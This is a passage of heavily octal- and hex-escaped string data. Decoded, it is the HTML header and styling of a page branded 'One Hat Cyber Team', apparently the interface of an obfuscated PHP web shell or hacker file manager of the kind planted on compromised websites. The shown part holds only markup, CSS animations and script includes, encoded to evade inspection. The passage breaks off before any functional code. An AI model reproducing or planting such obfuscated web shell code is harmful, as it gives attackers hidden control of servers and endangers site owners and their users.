x2e\66\x2e\60\57\144\x69\163\164\x2f\143\x73\163\57\x62\157\157\x74\x73\164\162\x61\160\56\155\151\x6e\56\143\x73\163\42\x3e\xd\12\40\40\40\x20\74\154\151\x6e\x6b\x20\x72\x65\154\75\x22\163\164\x79\154\x65\x73\x68\x65\x65\x74\x22\x20\x68\162\x65\146\75\x22\x2f\x2f\143\x64\156\x6a\x73\x2e\x63\154\x6f\165\144\x66\154\141\162\x65\x2e\143\157\155\x2f\x61\152\x61\x78\57\154\x69\142\163\57\146\x6f\156\x74\x2d\x61\167\145\x73\157\x6d\145\x2f\x34\56\67\56\x30\57\x63\x73\163\x2f\146\x6f\156\x74\x2d\x61\x77\145\x73\x6f\155\145\56\x6d\x69\156\56\x63\x73\163\x22\76\15\xa\40\40\40\x20\74\154\151\x6e\153\x20\162\145\154\x3d\x22\x69\143\x6f\156\x22\40\x68\x72\145\146\75\x22\57\x2f\x69\x2e\x69\155\x67\165\162\56\143\157\155\57\162\162\x6f\x54\120\x42\x4b\56\x6a\160\x65\x67\42\76\15\xa\x20\x20\x20\40\x3c\x73\164\x79\154\145\40\164\x79\160\145\x3d\x22\164\145\x78\x74\57\x63\x73\x73\42\x3e\15\xa\100\151\x6d\160\x6f\162\164\40\x75\162\154\50\x27\x68\164\164\160\163\72\57\57\146\157\156\164\163\56\147\157\x6f\147\154\x65\141\160\151\x73\56\143\157\x6d\57\143\163\x73\62\x3f\146\x61\155\x69\x6c\171\x3d\x54\145\170\164\x75\162\151\156\141\72\x69\164\141\154\x2c\x6f\x70\163\172\54\x77\147\150\x74\x40\60\x2c\x31\x32\56\56\x37\62\54\x31\x30\60\x2e\56\71\x30\x30\73\61\54\61\62\x2e\56\x37\x32\x2c\61\60\x30\56\56\x39\60\60\46\x64\x69\163\160\154\x61\171\75\x73\x77\141\x70\47\51\73\15\xa\142\x6f\x64\x79\40\x7b\xd\xa\40\40\x20\x20\143\157\x6c\157\162\72\x20\x62\x6c\x61\143\x6b\73\15\xa\40\40\40\40\146\x6f\156\164\x2d\x73\151\x7a\145\x3a\x20\x30\x70\170\x3b\15\xa\x20\x20\x20\x20\x66\157\x6e\164\x2d\x66\141\155\151\x6c\171\72\40\47\124\145\x78\164\165\x72\151\156\141\x27\73\15\12\40\x20\x20\40\167\151\144\x74\x68\72\x20\71\71\45\x3b\xd\xa\x20\x20\40\40\x70\x61\x64\144\151\156\x67\72\40\60\160\x78\x3b\xd\xa\40\40\40\x20\155\x61\x72\x67\151\156\55\162\x69\x67\x68\164\72\40\141\165\x74\157\73\xd\12\40\40\40\x20\155\141\162\147\151\156\x2d\154\145\146\x74\72\x20\141\x75\164\x6f\73\xd\xa\40\x20\40\x20\155\x61\x72\147\151\156\55\164\157\x70\x3a\x20\x37\160\170\x3b\15\xa\x20\40\x20\x20\x6d\141\162\x67\151\x6e\55\x62\157\164\x74\157\155\x3a\40\67\160\x78\x3b\xd\12\40\40\x20\40\142\x61\143\153\x67\162\x6f\165\156\x64\x2d\x63\157\154\x6f\162\x3a\x20\142\x6c\x61\x63\x6b\41\151\155\x70\157\162\x74\x61\x6e\x74\73\xd\12\x7d\xd\xa\15\xa\x2e\x62\147\55\144\141\x72\153\x20\x7b\15\xa\40\40\x20\40\142\x61\x63\153\x67\x72\157\165\156\x64\x2d\x63\157\154\157\162\72\x20\x62\x6c\141\143\153\41\x69\x6d\x70\x6f\162\164\x61\156\164\73\15\12\175\xd\12\xd\12\x2e\x62\157\x72\144\145\162\40\173\xd\12\40\x20\x20\40\142\157\170\55\x73\x68\141\x64\x6f\167\72\40\60\160\x78\40\60\x70\x78\40\61\x30\x70\x78\40\43\x30\x30\142\x66\146\x66\73\15\xa\x20\x20\40\x20\142\157\162\144\145\x72\72\40\x32\160\170\40\x73\x6f\154\x69\144\40\43\x30\60\142\146\146\146\x21\x69\155\x70\157\x72\x74\141\156\164\73\15\xa\40\40\40\x20\x62\157\x72\144\145\162\55\162\141\x64\x69\165\163\72\x20\65\x70\x78\73\15\12\x20\40\40\x20\142\141\143\x6b\147\x72\x6f\165\x6e\x64\72\40\x74\x72\x61\x6e\x73\160\141\162\x65\x6e\x74\73\15\xa\x7d\xd\12\xd\xa\56\142\x6f\162\x64\x65\162\72\150\x6f\x76\145\x72\x20\x7b\xd\12\x20\40\x20\40\x62\x6f\x78\x2d\163\x68\x61\x64\x6f\167\72\x20\60\160\x78\x20\x30\160\170\x20\61\x30\x70\170\40\43\60\x30\142\146\146\x66\73\xd\xa\x20\x20\40\x20\142\157\x72\144\145\162\72\40\62\160\x78\x20\x73\157\154\151\x64\x20\x23\x30\60\142\x66\146\x66\x21\x69\x6d\x70\x6f\162\164\141\x6e\164\x3b\xd\xa\x7d\xd\xa\15\12\56\164\141\142\154\x65\40\x74\144\40\173\15\xa\40\x20\40\40\160\x61\144\x64\x69\156\147\72\40\60\56\61\162\145\155\x3b\15\12\x20\x20\x20\40\x62\x6f\170\x2d\x73\x68\141\144\157\x77\x3a\x20\151\156\x73\x65\164\x20\60\x70\170\x20\x30\x70\x78\40\x30\x70\x78\40\x31\x70\170\x20\43\x30\x30\x62\x66\x66\146\73\15\xa\x20\x20\x20\40\142\157\x72\x64\x65\162\x2d\162\x61\144\x69\165\163\72\x20\x32\x70\170\73\15\xa\x7d\xd\12\15\12\x2e\164\141\x62\154\145\40\x74\150\x65\141\144\x20\164\150\x20\173\xd\12\x20\40\40\x20\x66\157\x6e\164\x2d\x66\141\155\x69\x6c\171\72\x20\x27\124\x65\170\164\165\x72\x69\x6e\141\47\54\40\x63\165\x72\x73\x69\x76\145\73\xd\xa\40\x20\40\40\x62\x6f\x78\55\163\x68\141\x64\157\x77\72\x20\x69\156\x73\145\164\x20\x30\x70\170\x20\60\160\x78\40\x30\x70\170\40\x31\x2e\65\x70\x78\40\x23\x30\x30\142\x66\146\x66\73\xd\12\40\x20\x20\x20\143\x6f\154\157\162\x3a\40\x23\60\x30\142\x66\146\x66\x3b\xd\12\40\40\x20\x20\160\141\144\144\151\156\x67\x3a\40\x30\56\x32\x35\x72\145\155\73\xd\12\40\x20\x20\40\142\x6f\162\144\145\162\55\x72\141\144\151\165\x73\x3a\x20\x35\x70\x78\x3b\xd\12\x20\x20\x20\40\x62\x61\143\x6b\x67\x72\157\x75\x6e\144\x3a\x20\x6c\151\156\x65\141\162\55\x67\x72\141\x64\151\145\x6e\x74\50\x74\x6f\x20\x62\157\164\x74\x6f\155\x2c\40\x62\154\141\x63\153\x2c\x20\43\63\x66\63\146\x33\x66\70\60\x29\x3b\xd\xa\175\xd\12\xd\12\56\x74\x61\142\x6c\145\x2d\150\x6f\166\145\x72\40\164\x62\x6f\x64\x79\x20\x74\162\72\x68\x6f\x76\x65\162\x20\x74\x64\x20\173\xd\12\x20\x20\x20\x20\x62\x61\x63\x6b\147\162\x6f\165\156\x64\x3a\40\x23\63\x66\x33\x66\63\146\70\60\73\xd\xa\40\40\40\x20\x62\x6f\x78\55\x73\150\x61\144\157\x77\x3a\x20\151\x6e\x73\x65\x74\x20\x30\x70\x78\40\x30\160\x78\40\x30\x70\170\40\x31\x70\x78\x20\x23\x30\60\x62\x66\x66\146\x3b\15\12\x20\x20\x20\40\142\x6f\x72\144\145\162\x2d\x72\141\x64\x69\165\x73\x3a\40\x32\160\x78\x3b\15\xa\x7d\xd\12\15\xa\x2e\164\x61\142\154\x65\55\150\157\x76\x65\162\40\164\142\x6f\144\x79\x20\164\162\x3a\x68\157\x76\x65\x72\x20\164\144\x3e\x2a\x20\x7b\15\xa\x7d\15\12\15\12\56\x74\x61\142\154\145\x3e\x74\142\x6f\x64\x79\76\x74\x72\76\x2a\x20\173\xd\12\40\40\x20\x20\x63\157\x6c\x6f\162\72\x23\146\x66\x66\x3b\xd\xa\40\x20\40\x20\x76\145\x72\x74\x69\x63\141\154\x2d\141\x6c\x69\x67\x6e\x3a\155\x69\144\x64\154\x65\73\xd\xa\x7d\xd\12\15\xa\56\x66\157\162\155\x2d\x63\x6f\x6e\x74\162\157\x6c\40\x7b\15\xa\x20\x20\x20\x20\x62\141\143\153\x67\x72\157\165\x6e\144\x3a\60\x20\60\41\x69\x6d\x70\x6f\x72\x74\141\x6e\x74\x3b\15\12\40\x20\40\40\x63\x6f\x6c\157\x72\x3a\x23\146\146\146\41\151\155\x70\157\162\x74\x61\156\x74\73\xd\12\40\x20\40\x20\142\x6f\x72\x64\145\162\x2d\162\141\x64\151\x75\163\72\60\x3b\15\12\x7d\15\xa\15\xa\56\x66\157\x72\x6d\x2d\x63\157\x6e\164\162\157\x6c\x3a\72\x70\x6c\141\x63\145\150\x6f\x6c\x64\145\x72\40\x7b\xd\12\x20\x20\x20\x20\x63\x6f\154\x6f\162\72\x23\x66\x66\x66\73\xd\xa\x20\x20\40\x20\157\160\141\x63\x69\x74\x79\x3a\x31\x3b\xd\xa\x7d\xd\12\xd\xa\56\x66\x6f\x72\155\55\x67\162\157\x75\160\40\173\15\xa\40\x20\x20\x20\x6d\141\x72\147\x69\x6e\55\164\x6f\x70\72\x20\56\x33\162\x65\x6d\73\xd\xa\x20\40\x20\40\x6d\141\162\147\x69\156\x2d\142\157\164\x74\x6f\155\x3a\40\x2e\63\162\145\155\x3b\xd\12\x7d\15\xa\15\12\154\151\40\173\15\12\x20\40\x20\40\x66\x6f\156\x74\55\163\x69\172\x65\72\x6c\141\x72\x67\145\x21\151\155\x70\157\x72\164\141\156\x74\x3b\xd\xa\x20\x20\x20\40\143\x6f\x6c\157\x72\72\40\43\x30\60\142\x66\146\146\41\151\x6d\160\157\162\x74\x61\156\164\73\15\12\40\x20\x20\x20\x6c\151\x73\164\55\x73\x74\171\154\x65\x3a\x20\151\x6e\150\145\x72\151\164\x21\151\x6d\x70\157\162\x74\x61\x6e\x74\x3b\xd\12\x7d\xd\xa\15\12\141\40\173\15\12\40\40\40\x20\x63\x6f\x6c\157\162\72\x20\43\x66\x66\x66\146\146\146\x3b\15\12\x20\40\x20\x20\164\x65\x78\x74\x2d\144\x65\143\x6f\x72\141\164\151\x6f\x6e\72\x20\x6e\x6f\x6e\145\41\151\x6d\160\157\162\x74\x61\156\164\73\15\xa\175\xd\12\15\xa\141\72\x68\157\166\x65\162\40\x7b\xd\xa\40\40\x20\x20\x74\145\170\x74\55\x64\x65\143\x6f\x72\x61\x74\x69\x6f\156\x3a\x20\156\157\x6e\145\41\x69\x6d\x70\157\162\x74\141\156\x74\73\xd\12\40\40\40\x20\143\x6f\x6c\x6f\162\72\x20\43\60\x30\x62\146\x66\146\73\15\xa\x20\x20\x20\40\x61\156\151\155\141\164\151\157\x6e\72\x20\x6b\x65\x64\x69\160\x20\x31\x73\x20\154\151\x6e\x65\141\x72\40\x69\x6e\x66\151\156\x69\164\x65\73\xd\12\175\xd\xa\xd\12\x68\x35\40\x7b\xd\12\40\40\x20\40\x6d\141\162\147\x69\156\55\164\157\x70\72\x20\61\56\x35\x70\170\73\15\xa\40\x20\x20\40\155\x61\162\147\x69\156\x2d\x62\x6f\x74\164\157\x6d\72\x20\x31\x2e\65\160\x78\x3b\15\12\x20\40\x20\x20\x63\x6f\154\x6f\162\x3a\40\x23\60\60\142\x66\146\x66\41\x69\155\x70\x6f\162\164\141\156\x74\73\xd\xa\x20\x20\x20\x20\160\141\144\x64\x69\156\147\72\x20\x32\160\x78\x3b\xd\xa\x7d\15\xa\xd\12\164\x65\170\164\x61\x72\x65\141\x20\x7b\15\xa\x20\40\40\40\167\151\144\x74\150\x3a\40\x39\x37\45\73\15\12\x20\40\x20\x20\x66\x6f\x6e\x74\55\x73\x69\x7a\145\72\x20\155\145\x64\x69\x75\155\x21\x69\155\x70\157\162\164\141\156\x74\x3b\15\xa\40\x20\x20\40\x66\x6f\156\164\x2d\146\x61\155\151\x6c\171\72\x20\151\x6e\150\145\x72\151\x74\x3b\15\xa\40\x20\40\40\150\x65\x69\x67\x68\164\x3a\x20\64\x34\x76\150\x3b\15\12\x20\x20\x20\x20\160\141\x64\x64\x69\x6e\147\x2d\154\145\146\164\72\x20\65\x70\170\73\15\xa\x7d\15\12\xd\xa\x62\x75\164\x74\x6f\156\54\40\151\x6e\160\x75\x74\x20\173\15\12\x20\40\x20\x20\142\x6f\162\144\x65\162\72\x20\62\160\x78\x20\163\157\154\x69\144\40\43\60\60\142\x66\146\x66\73\xd\12\40\x20\x20\40\142\157\x72\144\145\x72\x2d\x72\x61\144\x69\165\163\72\x20\65\160\170\x3b\15\12\40\x20\x20\40\x66\157\x6e\164\x2d\163\x69\x7a\x65\72\x20\x31\65\x70\170\73\xd\xa\40\40\40\x20\143\x6f\154\x6f\162\x3a\x77\150\151\164\145\x3b\xd\12\40\40\x20\40\x6c\151\156\145\x2d\x68\145\x69\x67\x68\x74\72\40\156\x6f\x72\x6d\x61\x6c\73\xd\12\40\40\x20\x20\146\157\x6e\164\55\x66\141\155\151\x6c\x79\72\40\151\x6e\x68\x65\x72\151\164\73\xd\12\x7d\15\xa\15\12\142\165\x74\164\157\156\x2c\x20\x69\x6e\x70\x75\x74\x3a\150\157\166\145\x72\x20\x7b\xd\xa\x20\40\40\40\142\x6f\162\144\x65\x72\x3a\x20\62\160\170\40\x73\157\154\151\x64\x20\43\x30\60\x62\x66\x66\146\73\15\xa\40\40\40\x20\143\x75\162\x73\157\162\x3a\x20\x70\x6f\151\156\x74\x65\x72\x3b\xd\xa\175\xd\xa\xd\xa\x2e\157\150\x63\x74\x20\173\xd\xa\40\40\x20\40\160\141\x64\144\151\x6e\x67\55\154\x65\146\164\x3a\x20\x31\162\x65\155\x3b\xd\xa\x20\40\x20\40\x70\141\x64\x64\x69\x6e\147\55\x72\x69\147\150\x74\72\40\x31\162\x65\x6d\73\xd\12\40\x20\40\40\143\x6f\x6c\x6f\x72\x3a\x20\167\150\x69\x74\x65\73\15\12\x20\40\40\x20\x62\157\x72\144\145\x72\x3a\40\62\160\170\x20\x73\x6f\x6c\151\144\40\43\x30\60\x62\146\146\x66\x3b\xd\12\40\40\x20\40\x62\x6f\162\x64\x65\162\55\x72\141\x64\x69\165\x73\x3a\40\x35\160\170\73\xd\xa\x20\x20\x20\x20\142\x61\x63\x6b\147\x72\157\165\x6e\144\55\143\x6f\154\x6f\x72\x3a\x20\x74\162\141\x6e\x73\160\141\162\145\x6e\164\x3b\xd\12\x20\40\x20\x20\x66\x6f\x6e\x74\55\146\141\x6d\151\x6c\x79\x3a\40\151\156\x68\145\162\151\x74\73\15\xa\x20\x20\x20\x20\146\157\x6e\x74\55\163\x69\x7a\x65\72\x20\61\x36\x70\170\x3b\xd\xa\x7d\xd\xa\15\12\x2e\x6f\150\x63\x74\x3a\150\x6f\x76\x65\x72\x20\173\xd\12\x20\x20\40\40\x62\x6f\x72\x64\x65\162\72\40\x32\160\x78\40\163\x6f\x6c\x69\x64\40\x23\x30\x30\142\x66\146\x66\x3b\15\xa\40\40\40\40\143\157\x6c\x6f\162\72\x20\43\60\x30\142\146\x66\x66\41\x69\x6d\x70\157\162\164\141\156\164\x3b\15\xa\x7d\xd\12\xd\xa\56\143\x6f\x6d\142\x65\164\x20\x7b\15\12\x20\40\40\x20\143\157\x6c\157\x72\72\40\x77\x68\x69\x74\145\73\15\12\x7d\15\12\xd\12\x2e\x63\157\155\x62\145\x74\72\150\x6f\x76\x65\162\x20\x7b\xd\xa\x20\40\40\40\x63\x6f\154\x6f\x72\x3a\x20\43\60\x30\x62\146\146\146\73\15\xa\175\15\12\15\xa\56\160\55\x31\40\x7b\15\12\x20\x20\40\x20\x70\x61\x64\144\151\156\x67\72\40\x34\160\170\x3b\15\12\x7d\xd\xa\xd\12\x3a\x3a\x73\x65\154\x65\143\x74\151\157\x6e\x20\173\15\xa\x20\x20\x20\40\x63\157\x6c\157\x72\72\40\x62\x6c\x61\143\x6b\x3b\15\12\40\40\x20\x20\142\141\143\153\147\x72\157\x75\x6e\x64\x3a\x20\x73\x69\x6c\166\145\x72\73\xd\12\175\xd\12\xd\12\x2e\146\141\x20\x7b\xd\12\40\x20\40\x20\x70\x61\x64\144\151\x6e\147\72\x20\x31\x30\x70\x78\x3b\15\xa\x20\x20\40\40\x66\x6f\156\x74\55\163\151\172\x65\72\x20\x32\60\160\x78\73\15\xa\x20\40\x20\x20\167\151\x64\164\x68\72\x20\65\x30\x70\170\73\xd\xa\x20\x20\x20\x20\164\x65\170\164\x2d\x61\154\151\147\x6e\x3a\x20\x63\145\x6e\x74\x65\x72\73\15\xa\40\40\x20\x20\x74\145\x78\164\x2d\144\145\x63\157\x72\x61\164\151\157\156\72\x20\x6e\x6f\x6e\145\x3b\xd\12\40\40\x20\x20\155\141\162\x67\x69\156\x3a\x20\x35\160\x78\x3b\15\12\40\40\40\x20\143\157\x6c\157\162\72\40\43\x30\x30\x62\146\x66\x66\73\15\12\175\xd\12\xd\xa\56\146\141\72\150\157\x76\x65\162\40\x7b\15\xa\40\x20\x20\40\142\157\162\x64\145\162\72\x20\62\x70\x78\40\x73\x6f\x6c\x69\x64\40\x23\x30\60\142\x66\146\x66\73\15\xa\x7d\15\xa\xd\xa\x2e\164\145\x78\x74\55\x6c\151\147\x68\164\40\173\15\xa\40\x20\x20\40\x63\x6f\154\x6f\x72\x3a\40\43\x66\70\x66\71\x66\141\x21\x69\x6d\160\157\x72\164\x61\x6e\x74\x3b\xd\xa\x20\x20\x20\x20\x66\157\x6e\164\x2d\x73\x69\172\x65\x3a\40\154\141\162\x67\x65\x21\151\155\x70\x6f\162\x74\x61\x6e\164\73\15\12\175\15\12\xd\xa\56\153\145\144\151\x70\40\x7b\15\12\40\x20\x20\40\141\x6e\151\x6d\141\164\151\x6f\x6e\72\40\x6b\x65\x64\151\160\x20\x31\163\40\x6c\x69\x6e\145\x61\162\x20\151\156\146\x69\156\x69\164\x65\73\15\xa\x7d\xd\xa\15\12\x40\x6b\x65\171\x66\162\x61\155\x65\163\x20\153\x65\144\151\160\x20\173\15\12\40\40\40\40\x30\x25\40\x7b\xd\12\40\40\40\x20\x20\x20\40\40\x63\157\x6c\x6f\162\72\x20\43\x30\x30\142\146\146\x66\73\15\xa\40\40\40\40\x7d\15\12\x20\x20\x20\40\65\60\x25\x20\x7b\15\xa\40\x20\40\40\40\40\x20\x20\143\x6f\154\x6f\x72\x3a\x20\x77\x68\151\x74\x65\x3b\xd\12\x20\x20\40\40\x7d\15\xa\40\x20\40\x20\61\x30\60\45\x20\x7b\xd\xa\40\40\40\x20\x20\40\40\x20\x63\x6f\154\157\x72\x3a\x20\x23\60\x30\x62\146\x66\x66\73\15\xa\x20\x20\x20\40\x7d\15\xa\x7d\xd\12\15\xa\x40\x6b\x65\171\146\x72\x61\155\x65\163\x20\162\x61\151\156\142\x6f\x77\102\x6f\x72\144\145\162\40\x7b\xd\12\x20\40\x20\x20\x20\40\40\40\40\x20\x20\40\60\x25\40\x7b\15\12\40\x20\x20\x20\40\x20\x20\x20\x20\x20\x20\40\40\40\40\40\142\157\162\x64\x65\162\x2d\x69\x6d\141\147\x65\x3a\x20\154\x69\x6e\145\141\162\55\x67\x72\x61\144\x69\145\156\x74\x28\164\157\40\162\x69\147\150\164\x2c\x20\43\60\x30\142\x66\146\x66\54\x20\155\x61\147\x65\156\164\x61\51\x20\61\x3b\15\xa\x20\x20\40\x20\40\x20\40\x20\40\40\40\x20\x7d\xd\12\x20\x20\40\40\x20\40\x20\40\x20\x20\40\x20\61\64\x25\40\173\15\12\x20\40\x20\x20\40\x20\40\40\40\x20\x20\x20\x20\40\x20\40\x62\x6f\162\x64\x65\162\x2d\x69\x6d\141\x67\145\x3a\40\x6c\151\x6e\x65\141\x72\55\147\162\141\x64\x69\x65\156\164\50\164\157\40\x72\151\x67\x68\164\54\x20\x6d\141\x67\145\x6e\x74\141\54\40\154\151\x6d\145\51\x20\61\73\xd\12\x20\40\40\40\x20\40\40\x20\40\x20\40\x20\175\xd\xa\x20\40\x20\x20\40\x20\x20\40\x20\40\40\x20\x32\x38\45\40\173\15\12\x20\x20\40\x20\x20\x20\x20\x20\x20\40\40\x20\x20\40\x20\40\x62\x6f\x72\x64\x65\x72\55\x69\x6d\x61\x67\x65\72\x20\154\x69\156\x65\x61\162\x2d\x67\x72\141\144\151\x65\x6e\x74\50\x74\x6f\x20\x72\151\x67\x68\164\x2c\40\154\151\x6d\x65\x2c\x20\171\145\x6c\154\x6f\167\51\x20\x31\73\15\xa\40\40\40\x20\x20\40\40\x20\40\40\40\40\x7d\15\12\x20\x20\40\40\40\x20\40\40\x20\x20\40\x20\64\62\x25\40\x7b\xd\xa\40\x20\x20\40\x20\x20\x20\40\x20\40\40\40\x20\x20\x20\x20\x62\157\x72\144\145\162\x2d\x69\155\141\x67\145\72\40\x6c\x69\156\x65\x61\162\55\x67\162\141\x64\151\145\156\164\x28\164\x6f\40\x72\151\147\x68\164\x2c\40\171\145\x6c\x6c\x6f\x77\x2c\x20\x6f\162\141\156\147\145\x29\40\x31\73\15\12\x20\40\40\x20\40\40\40\x20\40\x20\40\x20\175\xd\12\x20\40\x20\x20\40\40\x20\40\40\40\x20\x20\65\x37\45\x20\173\xd\12\x20\40\x20\x20\x20\40\x20\x20\x20\x20\x20\40\x20\x20\40\40\x62\157\x72\144\x65\x72\x2d\x69\155\x61\147\x65\x3a\x20\154\151\156\145\141\162\55\x67\x72\141\x64\x69\145\156\164\50\164\157\40\x72\x69\x67\150\x74\x2c\40\157\x72\141\x6e\x67\x65\x2c\40\162\145\x64\51\x20\x31\73\xd\xa\x20\40\x20\40\x20\40\x20\x20\40\40\x20\40\x7d\xd\xa\40\40\x20\40\x20\40\40\x20\40\x20\40\40\x37\x31\x25\40\173\xd\xa\x20\40\40\40\40\x20\40\x20\x20\40\40\40\x20\40\x20\x20\142\157\162\x64\145\162\x2d\x69\x6d\x61\x67\145\72\40\154\151\156\145\141\x72\55\147\x72\141\144\x69\x65\x6e\x74\50\x74\x6f\x20\x72\151\x67\150\164\54\x20\x72\145\x64\x2c\40\x70\x69\156\x6b\51\40\61\x3b\xd\12\x20\40\40\40\x20\40\x20\40\40\40\x20\x20\175\15\xa\40\40\x20\x20\40\x20\40\40\40\x20\40\x20\x38\x35\45\x20\173\xd\12\40\x20\40\40\40\40\x20\40\x20\40\40\x20\40\x20\x20\x20\x62\157\x72\144\x65\x72\55\151\155\x61\x67\145\72\40\154\151\x6e\145\x61\162\55\147\162\141\144\x69\x65\x6e\x74\x28\x74\157\40\162\x69\x67\x68\x74\x2c\x20\x70\x69\156\153\54\40\43\60\60\142\146\x66\146\x29\40\x31\73\15\12\x20\40\x20\40\40\x20\x20\40\40\40\40\x20\x7d\15\12\40\x20\40\40\40\x20\40\x20\40\40\40\40\x31\60\x30\45\40\x7b\15\12\x20\40\40\x20\x20\40\40\x20\x20\x20\40\40\x20\x20\x20\x20\x62\157\162\144\x65\x72\55\151\x6d\141\x67\145\72\x20\154\x69\x6e\x65\x61\162\x2d\147\162\x61\144\151\145\x6e\x74\50\164\157\40\162\x69\147\x68\164\54\40\43\60\60\x62\146\x66\146\x2c\40\x6d\x61\147\145\x6e\164\141\x29\40\x31\x3b\xd\xa\40\x20\40\40\40\x20\40\x20\40\x20\40\x20\x7d\xd\12\40\x20\x20\40\40\40\40\x20\175\xd\xa\xd\12\x2e\x72\x61\x69\156\x62\157\x77\x2d\142\157\162\144\145\162\x20\173\xd\xa\40\x20\x20\40\x62\157\162\144\145\162\72\40\x32\160\x78\40\x73\157\x6c\151\144\40\x72\x65\x64\73\xd\12\40\x20\40\40\142\x6f\162\x64\145\x72\55\x72\x61\144\151\x75\163\x3a\40\65\160\x78\41\x69\155\160\157\x72\164\141\x6e\x74\x3b\xd\12\40\40\x20\40\141\156\x69\x6d\x61\x74\x69\x6f\x6e\72\x20\162\141\151\x6e\x62\157\167\102\157\x72\144\145\x72\x20\x32\163\40\x6c\151\x6e\x65\141\162\x20\151\x6e\x66\x69\156\151\164\x65\x3b\xd\12\x7d\xd\12\x20\x20\40\40\x20\40\40\x20\x40\153\x65\171\x66\x72\x61\155\x65\163\x20\x72\141\151\156\142\x6f\167\x54\x65\x78\x74\40\173\xd\12\40\40\x20\x20\x20\x20\x20\x20\x20\x20\40\40\60\x25\x20\x7b\15\12\40\x20\40\x20\40\x20\40\40\40\40\40\40\40\x20\x20\40\143\157\x6c\157\162\72\40\43\x30\60\142\x66\x66\x66\73\15\12\x20\40\40\40\40\40\40\40\40\x20\x20\x20\175\15\12\40\40\40\x20\40\40\40\40\40\40\40\x20\61\64\45\40\173\15\12\40\40\x20\40\40\x20\40\40\x20\40\40\40\x20\x20\x20\40\x63\x6f\x6c\157\x72\x3a\40\155\141\147\145\156\164\x61\x3b\15\12\40\x20\40\x20\40\40\40\x20\40\x20\x20\x20\x7d\xd\xa\40\x20\x20\x20\40\x20\40\x20\x20\x20\x20\x20\x32\70\45\40\x7b\15\xa\x20\x20\x20\40\40\40\40\40\40\40\40\40\x20\40\40\x20\143\x6f\154\x6f\162\72\40\x6c\x69\x6d\145\x3b\15\12\40\40\x20\x20\40\x20\x20\40\x20\40\x20\40\x7d\15\xa\40\40\x20\x20\40\40\x20\40\40\40\x20\40\64\x32\45\40\173\15\xa\40\x20\40\40\x20\x20\x20\40\40\40\40\x20\40\x20\x20\x20\143\x6f\x6c\157\x72\x3a\40\171\x65\x6c\154\157\167\x3b\15\xa\40\40\x20\40\x20\x20\x20\40\40\40\x20\x20\175\15\xa\x20\40\x20\40\x20\40\40\40\40\x20\x20\x20\65\x37\x25\x20\x7b\15\12\40\x20\x20\40\x20\x20\x20\x20\40\40\40\x20\x20\40\x20\40\143\157\154\157\162\72\x20\x6f\162\141\x6e\x67\x65\73\15\12\x20\x20\40\x20\x20\40\x20\x20\40\40\40\40\175\15\12\x20\40\x20\x20\40\x20\40\x20\x20\40\40\40\67\x31\45\x20\x7b\15\xa\x20\x20\40\x20\x20\40\40\40\40\x20\40\40\40\40\x20\40\143\157\x6c\157\162\x3a\x20\x72\x65\144\73\15\xa\40\40\x20\x20\40\x20\40\x20\x20\x20\40\x20\x7d\15\12\40\x20\x20\x20\x20\x20\40\40\x20\x20\x20\40\70\65\45\x20\x7b\xd\12\x20\x20\40\x20\40\x20\40\40\40\x20\x20\40\40\40\40\40\143\157\154\157\162\x3a\40\160\x69\x6e\153\73\15\xa\40\40\40\40\x20\40\x20\x20\x20\40\40\40\175\15\xa\x20\x20\40\40\40\x20\40\40\x20\40\x20\x20\x31\60\x30\x25\40\173\15\12\x20\40\40\x20\x20\40\40\x20\40\40\40\x20\x20\x20\x20\x20\x63\x6f\154\x6f\162\72\40\x23\x30\60\142\x66\146\x66\73\xd\xa\40\x20\x20\x20\40\40\40\x20\x20\x20\x20\x20\x7d\xd\12\40\x20\x20\40\40\x20\40\40\x7d\xd\xa\56\x72\x61\x69\156\142\x6f\167\55\x74\x65\x78\x74\40\173\xd\xa\x20\x20\40\x20\40\40\x20\40\40\x20\x20\40\141\x6e\x69\x6d\141\x74\x69\157\x6e\x3a\x20\x72\x61\151\x6e\142\x6f\167\124\x65\170\164\x20\x32\x73\x20\x69\x6e\x66\x69\x6e\x69\x74\145\x3b\xd\xa\40\40\40\40\x20\40\x20\x20\40\40\x20\40\x66\x6f\x6e\164\x2d\x77\x65\x69\147\150\164\72\40\x62\157\x6c\x64\73\xd\xa\40\40\x20\x20\40\40\40\x20\x7d\15\12\74\57\163\164\x79\x6c\145\x3e\xd\12\40\40\x20\40\x3c\163\143\x72\151\x70\164\x20\163\162\143\75\42\57\x2f\x75\156\160\x6b\x67\x2e\143\x6f\x6d\57\x73\167\145\x65\164\141\x6c\145\162\x74\x2f\x64\151\163\164\x2f\x73\x77\x65\145\x74\141\154\145\x72\164\56\155\151\156\x2e\x6a\x73\x22\x3e\74\x2f\x73\143\x72\x69\x70\164\x3e\15\xa\x3c\57\x68\x65\141\144\x3e\15\12\x3c\142\157\144\171\x3e\15\xa\74\144\151\x76\x20\143\x6c\x61\163\x73\75\42\164\141\x62\154\145\55\x72\145\163\x70\x6f\x6e\x73\151\166\x65\40\164\145\170\x74\55\x6c\151\x67\x68\164\40\x72\141\x69\x6e\x62\157\167\x2d\142\x6f\162\x64\145\162\42\x20\x73\x74\171\154\x65\x3d\x22\x74\145\x78\164\x2d\x61\x6c\151\147\x6e\x3a\40\x6c\145\146\x74\73\x70\x61\144\144\151\156\147\72\x20\64\x70\170\73\42\76\xd\xa\x3c\x64\x69\166\x20\x73\x74\x79\154\x65\75\x22\164\145\170\164\55\141\x6c\151\x67\x6e\72\x20\x63\x65\156\x74\145\162\73\x64\151\163\160\154\x61\171\x3a\x20\146\154\145\170\x3b\x61\x6c\x69\x67\x6e\x2d\x69\x74\x65\x6d\163\x3a\40\143\x65\x6e\x74\145\162\x3b\152\165\x73\x74\151\x66\171\x2d\x63\157\x6e\x74\145\156\164\72\x20\143\145\156\x74\x65\162\73\x61\x6c\151\147\156\x2d\x63\157\x6e\x74\x65\156\x74\72\x20\x63\x65\x6e\x74\145\162\73\x22\76\xd\12\x3c\x61\40\150\x72\145\x66\75\42\77\42\x20\163\x74\x79\x6c\x65\75\42\x66\157\x6e\164\55\163\x69\x7a\x65\x3a\40\x32\162\145\x6d\x3b\x70\141\x64\x64\151\x6e\x67\x2d\154\x65\x66\x74\72\40\60\56\63\x72\x65\155\73\160\x61\x64\144\x69\156\x67\55\162\151\x67\x68\x74\72\x20\60\x2e\63\162\145\x6d\73\42\x3e\74\163\160\141\x6e\x20\x63\x6c\141\x73\163\x3d\42\x72\141\x69\x6e\x62\157\x77\x2d\164\145\x78\x74\x22\x3e\117\x6e\x65\x20\x48\x61\164\x20\x43\171\142\x65\x72\x20\x54\x65\x61\x6d\x3c\x2f\163\160\141\156\76\x3c\57\141\x3e\40\15\12\74\x